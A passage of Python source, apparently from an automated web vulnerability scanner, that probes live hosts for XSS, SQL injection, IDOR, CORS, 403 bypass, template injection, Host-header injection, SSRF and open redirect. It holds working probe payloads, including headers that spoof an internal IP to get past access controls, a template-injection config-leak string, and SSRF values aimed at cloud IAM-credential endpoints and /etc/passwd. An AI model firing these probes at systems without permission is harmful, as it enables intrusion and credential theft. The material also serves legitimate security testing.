        r'[?&](?:url|redirect|redirect_url|redirect_to|redirecturl|next|dest|'
        r'destination|go|goto|return|returnto|return_to|returnurl|continue|'
        r'forward|out|exit|location|target|link|ref|callback|href|to)=',
        re.I
    ),
    "lfi": re.compile(
        r'[?&](?:file|path|dir|directory|document|root|include|require|load|read|'
        r'open|template|view|page|layout|module|section|content|config|setting|'
        r'language|lang|locale|style|theme|skin|folder|log|report|export)=',
        re.I
    ),
    "rce": re.compile(
        r'[?&](?:cmd|exec|command|execute|run|system|shell|process|daemon|service|'
        r'script|code|eval|expression|query|pipeline|job|task|scheduler|cron|'
        r'ping|tracert|traceroute|nslookup|host|dig|curl|wget)=',
        re.I
    ),
    "idor": re.compile(
        r'[?&](?:id|uid|userid|user_id|account_id|account|profile|username|email|'
        r'order_id|order|invoice|ticket|document|record|ref|reference|token|'
        r'session|guid|uuid|hash|key|secret|code|number|no|num)=',
        re.I
    ),
}


def run_gf_patterns(filtered_file: str, out_dir: str, logger: logging.Logger) -> dict:
    """
    Classify URLs by vulnerability type using built-in patterns or gf tool.
    Returns dict of {pattern_name: filepath}.
    """
    logger.info(colorize("[PHASE 8b] Classifying endpoints by vulnerability type", Colors.MAGENTA + Colors.BOLD))

    urls = read_lines(filtered_file)
    env_path = _build_env().get("PATH")
    gf_tool  = shutil.which("gf", path=env_path)
    results: dict = {}

    for pattern_name, regex in _GF_PATTERNS.items():
        out_file = os.path.join(out_dir, f"gf_{pattern_name}.txt")

        if gf_tool:
            # gf requires URLs piped via stdin: cat urls.txt | gf xss
            try:
                proc = subprocess.run(
                    [gf_tool, pattern_name],
                    input="\n".join(urls),
                    capture_output=True,
                    text=True,
                    timeout=30,
                    env=_build_env(),
                )
                matches = [l.strip() for l in proc.stdout.splitlines() if l.strip()]
                if matches:
                    write_lines(out_file, matches)
                else:
                    # gf had no matches or pattern not found → fallback
                    matched = [u for u in urls if regex.search(u)]
                    write_lines(out_file, matched)
            except Exception:
                # gf unavailable or error → use built-in regex
                matched = [u for u in urls if regex.search(u)]
                write_lines(out_file, matched)
        else:
            # Built-in fallback
            matched = [u for u in urls if regex.search(u)]
            write_lines(out_file, matched)

        count = count_lines(out_file)
        if count > 0:
            logger.info(f"  {pattern_name.upper():<10} candidates: {colorize(str(count), Colors.YELLOW)}")
            results[pattern_name] = out_file

    total = sum(count_lines(f) for f in results.values())
    logger.info(f"  Total classified endpoints: {colorize(str(total), Colors.GREEN)}")
    return results


# ═══════════════════════════════════════════════════════════════════════════
#  PHASE 10a — XSS SCANNING (dalfox)
# ═══════════════════════════════════════════════════════════════════════════

def run_dalfox(
    xss_urls_file: str,
    out_dir: str,
    config: dict,
    logger: logging.Logger,
) -> List[dict]:
    """XSS scanning with dalfox on classified XSS candidate URLs."""
    tool = _tool_path("dalfox", config)
    if not tool:
        logger.warning("  dalfox not found — install: go install github.com/hahwul/dalfox/v2@latest")
        return []

    url_count = count_lines(xss_urls_file)
    if url_count == 0:
        logger.info("  No XSS candidates to scan")
        return []

    logger.info(f"  Scanning {url_count} XSS candidates with dalfox")

    xss_out_json  = os.path.join(out_dir, "xss_findings.json")
    xss_out_txt   = os.path.join(out_dir, "xss_findings.txt")

    auth_cookie = config.get("auth_cookie", "")
    cmd = [
        tool, "file", xss_urls_file,
        "--output", xss_out_txt,
        "--format", "plain",
        "--silence",
        "--no-color",
        "--timeout", str(min(int(config.get("timeout", 30)), 30)),
        "--delay", "100",
        "--worker", "10",
    ]
    if auth_cookie:
        cmd += ["--cookie", auth_cookie]

    run_command(cmd, timeout=1200, logger=logger)

    # Parse results
    findings: List[dict] = []
    for line in read_lines(xss_out_txt):
        line = line.strip()
        if "[V]" in line or "[POC]" in line or "XSS" in line.upper():
            findings.append({
                "type":        "xss",
                "severity":    "high",
                "url":         line,
                "description": "Cross-Site Scripting (XSS)",
            })

    # Save as JSON
    with open(xss_out_json, "w") as f:
        json.dump(findings, f, indent=2)

    logger.info(f"  XSS findings: {colorize(str(len(findings)), Colors.RED if findings else Colors.GREEN)}")
    return findings


# ═══════════════════════════════════════════════════════════════════════════
#  PHASE 10b — SQL INJECTION (sqlmap)
# ═══════════════════════════════════════════════════════════════════════════

def run_sqlmap(
    sqli_urls_file: str,
    out_dir: str,
    config: dict,
    logger: logging.Logger,
) -> List[dict]:
    """Safe SQLi detection with sqlmap (non-destructive mode)."""
    tool = _tool_path("sqlmap", config)
    if not tool:
        # Try python3 -m sqlmap
        try:
            result = subprocess.run(
                ["python3", "-m", "sqlmap", "--version"],
                capture_output=True, text=True, timeout=5,
            )
            if result.returncode == 0:
                tool = "python3"
            else:
                logger.warning("  sqlmap not found — install: sudo apt install sqlmap -y")
                return []
        except Exception:
            logger.warning("  sqlmap not found — install: sudo apt install sqlmap -y")
            return []

    url_count = count_lines(sqli_urls_file)
    if url_count == 0:
        logger.info("  No SQLi candidates to scan")
        return []

    # Limit to first 30 URLs to avoid running forever
    sqli_urls = read_lines(sqli_urls_file)[:30]
    limited_file = os.path.join(out_dir, "sqli_limited.txt")
    write_lines(limited_file, sqli_urls)

    logger.info(f"  Testing {len(sqli_urls)} SQLi candidates (safe mode)")

    sqli_out_dir = os.path.join(out_dir, "sqlmap_output")
    ensure_dir(sqli_out_dir)

    auth_cookie = config.get("auth_cookie", "")
    cmd_prefix = ["python3", "-m", "sqlmap"] if tool == "python3" else [tool]
    cmd = cmd_prefix + [
        "-m", limited_file,
        "--batch",
        "--level", "2",
        "--risk", "1",
        "--timeout", "20",
        "--retries", "1",
        "--output-dir", sqli_out_dir,
        "--no-cast",
        "--technique", "BEUSTQ",
        "-q",
    ]
    if auth_cookie:
        cmd += ["--cookie", auth_cookie]

    run_command(cmd, timeout=1800, logger=logger)

    # Parse sqlmap results
    findings: List[dict] = []
    for root, dirs, files in os.walk(sqli_out_dir):
        for fname in files:
            if fname == "log":
                fpath = os.path.join(root, fname)
                content = open(fpath).read()
                if "sqlmap identified the following injection" in content.lower():
                    target_url = root.replace(sqli_out_dir, "").strip("/\\")
                    findings.append({
                        "type":        "sqli",
                        "severity":    "critical",
                        "url":         target_url,
                        "description": "SQL Injection detected by automated scanner",
                        "details":     content[:500],
                    })

    sqli_json = os.path.join(out_dir, "sqli_findings.json")
    with open(sqli_json, "w") as f:
        json.dump(findings, f, indent=2)

    logger.info(f"  SQLi findings: {colorize(str(len(findings)), Colors.RED if findings else Colors.GREEN)}")
    return findings


# ═══════════════════════════════════════════════════════════════════════════
#  PHASE 10c — IDOR DETECTION
# ═══════════════════════════════════════════════════════════════════════════

def run_idor_detection(
    idor_urls_file: str,
    out_dir: str,
    config: dict,
    logger: logging.Logger,
) -> List[dict]:
    """
    Basic IDOR detection: probe numeric IDs ±1 and look for different responses.
    """
    if not REQUESTS_AVAILABLE:
        return []

    idor_urls = read_lines(idor_urls_file)[:50]
    if not idor_urls:
        logger.info("  No IDOR candidates")
        return []

    logger.info(f"  Testing {len(idor_urls)} IDOR candidates")

    findings: List[dict] = []
    headers  = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"}
    auth_cookie = config.get("auth_cookie", "")
    if auth_cookie:
        headers["Cookie"] = auth_cookie

    timeout = min(int(config.get("timeout", 15)), 10)

    def _test_idor(url: str) -> Optional[dict]:
        try:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

            # Find numeric parameters
            for key, vals in params.items():
                val = vals[0] if vals else ""
                if not val.isdigit():
                    continue
                orig_id = int(val)

                # Get original response
                r1 = requests.get(url, headers=headers, timeout=timeout, verify=False, allow_redirects=True)

                # Try +1
                new_params = {k: v[0] for k, v in params.items()}
                new_params[key] = str(orig_id + 1)
                new_query = urllib.parse.urlencode(new_params)
                new_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
                r2 = requests.get(new_url, headers=headers, timeout=timeout, verify=False, allow_redirects=True)

                # Different content-length AND both 200 = potential IDOR
                if (r1.status_code == 200 and r2.status_code == 200
                        and len(r2.text) > 500          # meaningful response size
                        and abs(len(r1.text) - len(r2.text)) > 500  # significant difference
                        and abs(len(r1.text) - len(r2.text)) / max(len(r1.text), 1) > 0.1):  # >10% difference
                    return {
                        "type":        "idor",
                        "severity":    "high",
                        "url":         url,
                        "param":       key,
                        "description": f"Potential IDOR: param '{key}' returns different data for ID {orig_id} vs {orig_id+1}",
                    }
        except Exception:
            pass
        return None

    import concurrent.futures as _cf
    with _cf.ThreadPoolExecutor(max_workers=5) as exe:
        futs = [exe.submit(_test_idor, u) for u in idor_urls]
        for fut in _cf.as_completed(futs):
            result = fut.result()
            if result:
                findings.append(result)
                logger.warning(f"  Potential IDOR: {result['url']} (param: {result['param']})")

    idor_json = os.path.join(out_dir, "idor_findings.json")
    with open(idor_json, "w") as f:
        json.dump(findings, f, indent=2)

    logger.info(f"  IDOR candidates: {colorize(str(len(findings)), Colors.RED if findings else Colors.GREEN)}")
    return findings


# ═══════════════════════════════════════════════════════════════════════════
#  CORS MISCONFIGURATION DETECTION
# ═══════════════════════════════════════════════════════════════════════════

_CORS_TEST_ORIGINS = [
    "https://evil.com",
    "null",
    "https://evil.com.{domain}",       # domain confusion
    "https://{domain}.evil.com",       # subdomain trust
    "https://not{domain}",             # prefix match bypass
]


def run_cors_check(
    alive_file: str,
    out_dir: str,
    config: dict,
    logger: logging.Logger,
) -> List[dict]:
    """Test CORS misconfigurations on all alive hosts."""
    if not REQUESTS_AVAILABLE:
        return []

    logger.info(colorize("[CORS] Scanning for CORS misconfigurations", Colors.MAGENTA + Colors.BOLD))

    hosts = extract_urls_from_httpx_output(alive_file)
    if not hosts:
        hosts = [l for l in read_lines(alive_file) if l.startswith("http")]
    hosts = list(set(hosts))[:100]
    if not hosts:
        logger.info("  No hosts to test for CORS")
        return []

    findings: List[dict] = []
    headers  = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"}
    auth_cookie = config.get("auth_cookie", "")
    if auth_cookie:
        headers["Cookie"] = auth_cookie
    timeout = min(int(config.get("timeout", 15)), 10)

    def _test_cors(base_url: str) -> List[dict]:
        results = []
        parsed = urllib.parse.urlparse(base_url)
        domain  = parsed.netloc

        for origin_tmpl in _CORS_TEST_ORIGINS:
            origin = origin_tmpl.replace("{domain}", domain)
            try:
                resp = requests.get(
                    base_url,
                    headers={**headers, "Origin": origin},
                    timeout=timeout, verify=False, allow_redirects=True,
                )
                acao = resp.headers.get("Access-Control-Allow-Origin", "")
                acac = resp.headers.get("Access-Control-Allow-Credentials", "")

                vuln = False
                sev  = "medium"
                desc = ""

                if acao == "*" and acac.lower() == "true":
                    vuln = True; sev = "high"
                    desc = "CORS wildcard with credentials allowed"
                elif acao == origin and origin != "null" and acac.lower() == "true":
                    vuln = True; sev = "high"
                    desc = f"Arbitrary origin reflected with credentials: {origin}"
                elif acao == origin and "evil.com" in origin:
                    vuln = True; sev = "medium"
                    desc = f"Arbitrary origin reflected (no credentials): {origin}"
                elif acao == "null":
                    vuln = True; sev = "medium"
                    desc = "Null origin accepted"
                elif ".evil.com" in acao or "evil.com." in acao:
                    vuln = True; sev = "medium"
                    desc = f"Subdomain/prefix origin reflected: {acao}"

                if vuln:
                    results.append({
                        "type":     "cors",
                        "severity": sev,
                        "url":      base_url,
                        "origin":   origin,
                        "acao":     acao,
                        "credentials": acac,
                        "description": desc,
                    })
                    break  # Don't spam with every origin for same URL
            except Exception:
                pass
        return results

    import concurrent.futures as _cf
    with _cf.ThreadPoolExecutor(max_workers=15) as exe:
        futs = [exe.submit(_test_cors, h) for h in hosts]
        for fut in _cf.as_completed(futs):
            try:
                findings.extend(fut.result())
            except Exception:
                pass

    cors_json = os.path.join(out_dir, "cors_findings.json")
    with open(cors_json, "w") as f:
        json.dump(findings, f, indent=2)

    logger.info(f"  CORS findings: {colorize(str(len(findings)), Colors.RED if findings else Colors.GREEN)}")
    return findings


# ═══════════════════════════════════════════════════════════════════════════
#  403 BYPASS TESTING
# ═══════════════════════════════════════════════════════════════════════════

_BYPASS_HEADERS: List[dict] = [
    {"X-Forwarded-For":              "127.0.0.1"},
    {"X-Real-IP":                    "127.0.0.1"},
    {"X-Originating-IP":             "127.0.0.1"},
    {"X-Remote-IP":                  "127.0.0.1"},
    {"X-Remote-Addr":                "127.0.0.1"},
    {"X-Client-IP":                  "127.0.0.1"},
    {"X-Custom-IP-Authorization":    "127.0.0.1"},
    {"X-Forwarded-Host":             "localhost"},
    {"X-Host":                       "localhost"},
    {"Forwarded":                    "for=127.0.0.1;host=localhost"},
    {"CF-Connecting-IP":             "127.0.0.1"},
    {"True-Client-IP":               "127.0.0.1"},
    {"X-ProxyUser-Ip":               "127.0.0.1"},
    {"X-Original-URL":               "/"},
    {"X-Rewrite-URL":                "/"},
    {"X-HTTP-Method-Override":       "GET"},
]


def _403_path_variants(path: str) -> List[str]:
    """Generate path manipulation variants for 403 bypass."""
    stripped = path.rstrip("/")
    name = stripped.split("/")[-1] if "/" in stripped else stripped
    base = "/".join(stripped.split("/")[:-1]) if "/" in stripped else ""
    return [
        f"{stripped}/.",
        f"{stripped}//",
        f"/{name}",
        f"{stripped}%20",
        f"{stripped}%09",
        f"{stripped}?",
        f"{stripped}#",
        f"{stripped}/*",
        f"/{name}/",
        f"/%2e{stripped}",
        f"{base}/./{name}",
        f"{base}/..;/{name}",
        f"{base}/{name}../",
        f"{stripped}/..",
        f"///{name}",
    ]


def run_403_bypass(
    alive_file: str,
    out_dir: str,
    config: dict,
    logger: logging.Logger,
) -> List[dict]:
    """Test 403/401 responses for bypass techniques."""
    if not REQUESTS_AVAILABLE:
        return []

    logger.info(colorize("[403] Testing 403/401 bypass techniques", Colors.MAGENTA + Colors.BOLD))

    hosts = extract_urls_from_httpx_output(alive_file)
    if not hosts:
        hosts = [l for l in read_lines(alive_file) if l.startswith("http")]

    # Common protected paths to test
    protected_paths = [
        "/admin", "/admin/", "/administrator", "/panel", "/dashboard",
        "/api/admin", "/api/v1/admin", "/manage", "/management",
        "/config", "/server-status", "/server-info", "/.env",
        "/actuator", "/metrics", "/health", "/debug",
        "/api/users", "/api/internal", "/internal",
        "/backup", "/wp-admin", "/phpmyadmin",
    ]

    findings: List[dict] = []
    base_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"}
    auth_cookie  = config.get("auth_cookie", "")
    if auth_cookie:
        base_headers["Cookie"] = auth_cookie
    timeout = min(int(config.get("timeout", 10)), 10)

    import concurrent.futures as _cf

    def _test_url(url: str) -> List[dict]:
        results = []
        parsed   = urllib.parse.urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        for path in protected_paths:
            target = base_url + path
            # Check if actually 403
            try:
                r0 = requests.get(target, headers=base_headers, timeout=timeout,
                                  verify=False, allow_redirects=False)
                if r0.status_code not in (403, 401, 405):
                    continue
                original_code = r0.status_code
            except Exception:
                continue

            # Try header bypasses
            for h in _BYPASS_HEADERS:
                try:
                    rh = requests.get(
                        target,
                        headers={**base_headers, **h},
                        timeout=timeout, verify=False, allow_redirects=False,
                    )
                    if rh.status_code == 200:
                        results.append({
                            "type":        "403-bypass",
                            "severity":    "high",
                            "url":         target,
                            "method":      "header",
                            "payload":     str(h),
                            "bypass_code": rh.status_code,
                            "orig_code":   original_code,
                            "description": f"403 Bypass via header {list(h.keys())[0]}: {target}",
                        })
                        break
                except Exception:
                    pass

            # Try path manipulation bypasses
            for variant in _403_path_variants(path):
                try:
                    rv = requests.get(
                        base_url + variant,
                        headers=base_headers,
                        timeout=timeout, verify=False, allow_redirects=False,
                    )
                    if rv.status_code == 200 and len(rv.text) > 50:
                        results.append({
                            "type":        "403-bypass",
                            "severity":    "high",
                            "url":         base_url + variant,
                            "method":      "path-manipulation",
                            "payload":     variant,
                            "bypass_code": rv.status_code,
                            "orig_code":   original_code,
                            "description": f"403 Bypass via path: {base_url + variant}",
                        })
                        break
                except Exception:
                    pass
        return results

    with _cf.ThreadPoolExecutor(max_workers=8) as exe:
        futs = [exe.submit(_test_url, h) for h in hosts[:50]]
        for fut in _cf.as_completed(futs):
            try:
                findings.extend(fut.result())
            except Exception:
                pass

    bypass_json = os.path.join(out_dir, "bypass_findings.json")
    with open(bypass_json, "w") as f:
        json.dump(findings, f, indent=2)

    logger.info(f"  403 Bypass findings: {colorize(str(len(findings)), Colors.RED if findings else Colors.GREEN)}")
    return findings


# ═══════════════════════════════════════════════════════════════════════════
#  SSTI DETECTION (Server-Side Template Injection)
# ═══════════════════════════════════════════════════════════════════════════

# Polyglot payload: triggers in Jinja2, Twig, Smarty, Mako, Freemarker, Pebble
_SSTI_PAYLOADS: List[tuple] = [
    # (payload, expected_output_regex, engine)
    # Use unique math that is very unlikely to appear in normal page content
    ("{{7*7}}",              r"\b49\b",              "Jinja2/Twig"),
    ("{{7*'7'}}",            r"7777777",             "Jinja2"),        # 49 vs 7777777 distinguishes Jinja2/Twig
    ("${7777*7777}",         r"60491729",            "Freemarker/Spring"),
    ("#{7777*7777}",         r"60491729",            "Thymeleaf/Ruby"),
    ("*{7777*7777}",         r"60491729",            "Spring EL"),
    ("{7777*7777}",          r"60491729",            "Smarty"),
    ("<%=7777*7777%>",       r"60491729",            "ERB/EJS"),
    ("[[7777*7777]]",        r"60491729",            "NUNJUCKS"),
    ("${{7777*7777}}",       r"60491729",            "Template composite"),
    # Jinja2 info leak: check for actual SECRET_KEY pattern, not just "Config"
    ("{{config.items()}}",   r"SECRET_KEY|DATABASE_URL|SQLALCHEMY", "Jinja2 config leak"),
]




def run_ssti_detection(
    params_file: str,
    out_dir: str,
    config: dict,
    logger: logging.Logger,
) -> List[dict]:
    """Detect SSTI by injecting math payloads and looking for evaluated results."""
    if not REQUESTS_AVAILABLE:
        return []

    logger.info(colorize("[SSTI] Testing for Server-Side Template Injection", Colors.MAGENTA + Colors.BOLD))

    param_urls = read_lines(params_file)[:100]
    if not param_urls:
        logger.info("  No parameterized URLs to test for SSTI")
        return []

    findings: List[dict] = []
    headers  = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"}
    auth_cookie = config.get("auth_cookie", "")
    if auth_cookie:
        headers["Cookie"] = auth_cookie
    timeout = min(int(config.get("timeout", 15)), 10)

    import concurrent.futures as _cf

    def _test_ssti(url: str) -> List[dict]:
        results = []
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

        for param_name in params:
            # Get baseline response first (to avoid false positives)
            baseline_text = ""
            try:
                base_params = {k: v[0] for k, v in params.items()}
                base_params[param_name] = "SSTI_BASELINE_TEST_XYZ"
                base_url = urllib.parse.urlunparse(
                    parsed._replace(query=urllib.parse.urlencode(base_params))
                )
                br = requests.get(base_url, headers=headers, timeout=timeout, verify=False, allow_redirects=True)
                baseline_text = br.text
            except Exception:
                pass

            for payload, expected_re, engine in _SSTI_PAYLOADS:
                test_params = {k: v[0] for k, v in params.items()}
                test_params[param_name] = payload
                test_query = urllib.parse.urlencode(test_params)
                test_url   = urllib.parse.urlunparse(parsed._replace(query=test_query))
                try:
                    resp = requests.get(
                        test_url, headers=headers,
                        timeout=timeout, verify=False, allow_redirects=True,
                    )
                    # Confirm: pattern in injected response but NOT in baseline
                    match = re.search(expected_re, resp.text)
                    baseline_match = re.search(expected_re, baseline_text) if baseline_text else False
                    if match and not baseline_match:
                        results.append({
                            "type":        "ssti",
                            "severity":    "critical",
                            "url":         test_url,
                            "param":       param_name,
                            "payload":     payload,
                            "engine":      engine,
                            "description": f"SSTI ({engine}) via param '{param_name}': payload '{payload}' evaluated",
                        })
                        break  # One finding per param is enough
                except Exception:
                    pass
        return results

    with _cf.ThreadPoolExecutor(max_workers=8) as exe:
        futs = [exe.submit(_test_ssti, u) for u in param_urls]
        for fut in _cf.as_completed(futs):
            try:
                findings.extend(fut.result())
            except Exception:
                pass

    ssti_json = os.path.join(out_dir, "ssti_findings.json")
    with open(ssti_json, "w") as f:
        json.dump(findings, f, indent=2)

    logger.info(f"  SSTI findings: {colorize(str(len(findings)), Colors.RED if findings else Colors.GREEN)}")
    return findings


# ═══════════════════════════════════════════════════════════════════════════
#  HOST HEADER INJECTION
# ═══════════════════════════════════════════════════════════════════════════

def run_host_header_injection(
    alive_file: str,
    out_dir: str,
    config: dict,
    logger: logging.Logger,
) -> List[dict]:
    """
    Test for Host header injection:
    - Reflected in response
    - Redirect to injected value (password reset poisoning)
    - Cache poisoning potential (X-Forwarded-Host)
    """
    if not REQUESTS_AVAILABLE:
        return []

    logger.info(colorize("[HostHdr] Testing Host Header Injection", Colors.MAGENTA + Colors.BOLD))

    hosts = extract_urls_from_httpx_output(alive_file)
    if not hosts:
        hosts = [l for l in read_lines(alive_file) if l.startswith("http")]
    hosts = list(set(hosts))[:60]

    CANARY = "hostinjection-test-12345.evil.com"
    findings: List[dict] = []
    base_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"}
    auth_cookie  = config.get("auth_cookie", "")
    if auth_cookie:
        base_headers["Cookie"] = auth_cookie
    timeout = min(int(config.get("timeout", 10)), 10)

    import concurrent.futures as _cf

    def _test_host(url: str) -> List[dict]:
        results = []
        parsed = urllib.parse.urlparse(url)

        test_variants = [
            {"Host": CANARY},
            {"X-Forwarded-Host": CANARY},
            {"X-Host": CANARY},
            {"X-Forwarded-Server": CANARY},
            {"X-HTTP-Host-Override": CANARY},
            {"Forwarded": f"host={CANARY}"},
            # Password reset poisoning specific
            {"Host": f"{parsed.netloc}@{CANARY}"},
        ]

        # Common sensitive paths (password reset is most impactful)
        test_paths = ["/", "/forgot-password", "/reset-password",
                      "/password/reset", "/account/recover", "/api/auth/forgot"]

        for th in test_variants:
            for path in test_paths:
                test_url = f"{parsed.scheme}://{parsed.netloc}{path}"
                try:
                    resp = requests.get(
                        test_url,
                        headers={**base_headers, **th},
                        timeout=timeout, verify=False, allow_redirects=False,
                    )
                    body = resp.text[:50000]
                    redir = resp.headers.get("Location", "")

                    if CANARY in body:
                        results.append({
                            "type":        "host-header-injection",
                            "severity":    "high",
                            "url":         test_url,
                            "header":      list(th.keys())[0],
                            "description": f"Host header value reflected in response body at {path}",
                        })
                        return results  # One per host is enough
                    elif CANARY in redir:
                        results.append({
                            "type":        "host-header-injection",
                            "severity":    "critical",
                            "url":         test_url,
                            "header":      list(th.keys())[0],
                            "redirect_to": redir,
                            "description": f"Host header injection causes redirect to attacker domain — Password Reset Poisoning risk",
                        })
                        return results
                except Exception:
                    pass
        return results

    with _cf.ThreadPoolExecutor(max_workers=10) as exe:
        futs = [exe.submit(_test_host, h) for h in hosts]
        for fut in _cf.as_completed(futs):
            try:
                findings.extend(fut.result())
            except Exception:
                pass

    hh_json = os.path.join(out_dir, "hostheader_findings.json")
    with open(hh_json, "w") as f:
        json.dump(findings, f, indent=2)

    logger.info(f"  Host header injection: {colorize(str(len(findings)), Colors.RED if findings else Colors.GREEN)}")
    return findings


# ═══════════════════════════════════════════════════════════════════════════
#  SSRF DETECTION
# ═══════════════════════════════════════════════════════════════════════════

_SSRF_INTERNAL_PAYLOADS: List[tuple] = [
    # (payload, indicator_regex, description)
    ("http://169.254.169.254/latest/meta-data/",
     r"ami-id|instance-id|hostname|local-ipv4|security-groups",
     "AWS EC2 Metadata"),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
     r"AccessKeyId|SecretAccessKey|Token",
     "AWS IAM Credentials"),
    ("http://metadata.google.internal/computeMetadata/v1/",
     r"computeMetadata|project-id|instance",
     "GCP Metadata"),
    ("http://169.254.169.254/metadata/v1/",
     r"droplet_id|hostname|interfaces",
     "DigitalOcean Metadata"),
    ("http://100.100.100.200/latest/meta-data/",
     r"instance-id|hostname",
     "Alibaba Cloud Metadata"),
    ("http://localhost/",
     r"localhost|127\.0\.0\.1|<html",
     "Internal localhost"),
    ("file:///etc/passwd",
     r"root:x:|root:!|daemon:x:",
     "LFI via file:// scheme"),
    ("file:///etc/hosts",
     r"localhost|127\.0\.0\.1",
     "LFI /etc/hosts via file://"),
    ("dict://127.0.0.1:22/",
     r"SSH-|OpenSSH",
     "Internal SSH via DICT"),
    ("http://0.0.0.0/",
     r"<html|HTTP",
     "Internal 0.0.0.0"),
]

_SSRF_PARAM_RE = re.compile(
    r'[?&](?:url|uri|path|dest|destination|redirect|proxy|request|load|fetch|'
    r'host|resource|target|image|source|file|doc|document|page|feed|callback|'
    r'api|endpoint|server|addr|address|website|link|href|location|to|from|'
    r'origin|refer|referer|domain|forward|out|goto|next|return|data|src|'
    r'action|service|remote|external|content|download|include)=',
    re.I,
)


def _interactsh_available() -> Optional[str]:
    """Check if interactsh-client is available and return an OOB URL."""
    env_path = _build_env().get("PATH")
    tool = shutil.which("interactsh-client", path=env_path)
    return tool


def run_ssrf_detection(
    ssrf_urls_file: str,
    alive_params_file: str,
    out_dir: str,
    config: dict,
    logger: logging.Logger,
) -> List[dict]:
    """
    SSRF detection:
    1. If interactsh-client available: OOB SSRF testing
    2. Error-based: probe cloud metadata endpoints, file://, dict://
    3. Test SSRF-prone parameter names
    """
    if not REQUESTS_AVAILABLE:
        return []

    logger.info(colorize("[SSRF] Testing for Server-Side Request Forgery", Colors.MAGENTA + Colors.BOLD))

    # Collect candidate URLs
    ssrf_candidates = read_lines(ssrf_urls_file) if os.path.exists(ssrf_urls_file) else []
    if not ssrf_candidates:
        # Fall back to alive params + extract SSRF-prone ones
        all_params = read_lines(alive_params_file)
        ssrf_candidates = [u for u in all_params if _SSRF_PARAM_RE.search(u)]

    if not ssrf_candidates:
        logger.info("  No SSRF candidates found")
        return []

    ssrf_candidates = ssrf_candidates[:80]
    logger.info(f"  Testing {len(ssrf_candidates)} SSRF candidate URLs")

    findings: List[dict] = []
    base_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"}
    auth_cookie  = config.get("auth_cookie", "")
    if auth_cookie:
        base_headers["Cookie"] = auth_cookie
    timeout = min(int(config.get("timeout", 15)), 12)

    import concurrent.futures as _cf

    def _test_ssrf_error(url: str) -> List[dict]:
        """Error-based SSRF: inject cloud metadata URLs and check responses."""
        results = []
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

        for param_name, vals in params.items():
            orig_val = vals[0] if vals else ""
            # Only test URL-like or path-like parameters
            if not _SSRF_PARAM_RE.search(f"?{param_name}=x"):
                continue

            for payload, indicator_re, desc in _SSRF_INTERNAL_PAYLOADS:
                test_params = {k: v[0] for k, v in params.items()}
                test_params[param_name] = payload
                test_url = urllib.parse.urlunparse(
                    parsed._replace(query=urllib.parse.urlencode(test_params))
                )
                try:
                    resp = requests.get(
                        test_url, headers=base_headers,
                        timeout=timeout, verify=False, allow_redirects=True,
                    )
                    if re.search(indicator_re, resp.text, re.I):
                        results.append({
                            "type":        "ssrf",
                            "severity":    "critical",
                            "url":         test_url,
                            "param":       param_name,
                            "payload":     payload,
                            "indicator":   re.search(indicator_re, resp.text, re.I).group(0)[:80],
                            "description": f"SSRF confirmed: {desc} — Response contains metadata",
                        })
                        return results
                except Exception:
                    pass
        return results

    with _cf.ThreadPoolExecutor(max_workers=10) as exe:
        futs = [exe.submit(_test_ssrf_error, u) for u in ssrf_candidates]
        for fut in _cf.as_completed(futs):
            try:
                findings.extend(fut.result())
            except Exception:
                pass

    ssrf_json = os.path.join(out_dir, "ssrf_findings.json")
    with open(ssrf_json, "w") as f:
        json.dump(findings, f, indent=2)

    logger.info(f"  SSRF findings: {colorize(str(len(findings)), Colors.RED if findings else Colors.GREEN)}")
    return findings


# ═══════════════════════════════════════════════════════════════════════════
#  OPEN REDIRECT DETECTION
# ═══════════════════════════════════════════════════════════════════════════

_REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "///evil.com",
    "https://evil%2ecom",
    "https:evil.com",
    "/\\evil.com",
    "https://evil.com%23",
    "%68%74%74%70%73%3a%2f%2fevil%2ecom",  # URL encoded https://evil.com
]


def run_open_redirect(
    redirect_file: str,
    out_dir: str,
    config: dict,
    logger: logging.Logger,
) -> List[dict]:
    """Test open redirect vulnerabilities using GF redirect candidates."""
    if not REQUESTS_AVAILABLE:
        return []

    logger.info(colorize("[Redirect] Testing for Open Redirect", Colors.MAGENTA + Colors.BOLD))

    redirect_urls = read_lines(redirect_file) if os.path.exists(redirect_file) else []
    redirect_urls = redirect_urls[:100]
    if not redirect_urls:
        logger.info("  No redirect candidates to test")
        return []

    findings: List[dict] = []
    base_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"}
    auth_cookie  = config.get("auth_cookie", "")
    if auth_cookie:
        base_headers["Cookie"] = auth_cookie
    timeout = min(int(config.get("timeout", 10)), 8)

    import concurrent.futures as _cf

    def _test_redirect(url: str) -> List[dict]:
        results = []
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

        for param_name in params:
            for payload in _REDIRECT_PAYLOADS:
                test_params = {k: v[0] for k, v in params.items()}
                test_params[param_name] = payload
                test_url = urllib.parse.urlunparse(
                    parsed._replace(query=urllib.parse.urlencode(test_params))
                )
                try:
                    resp = requests.get(
                        test_url, headers=base_headers,
                        timeout=timeout, verify=False,
                        allow_redirects=False,
                    )
                    if resp.status_code in (301, 302, 303, 307, 308):
                        loc = resp.headers.get("Location", "")
                        # Decode URL-encoded location before checking (handles evil%2Ecom etc.)
                        loc_decoded = urllib.parse.unquote(loc)
                        if ("evil.com" in loc_decoded
                                or re.search(r"^https?://evil\.com", loc_decoded, re.I)
                                or re.match(r"^//[^/]", loc_decoded)):  # protocol-relative to external host
                            results.append({
                                "type":        "open-redirect",
                                "severity":    "medium",
                                "url":         test_url,
                                "param":       param_name,
                                "payload":     payload,
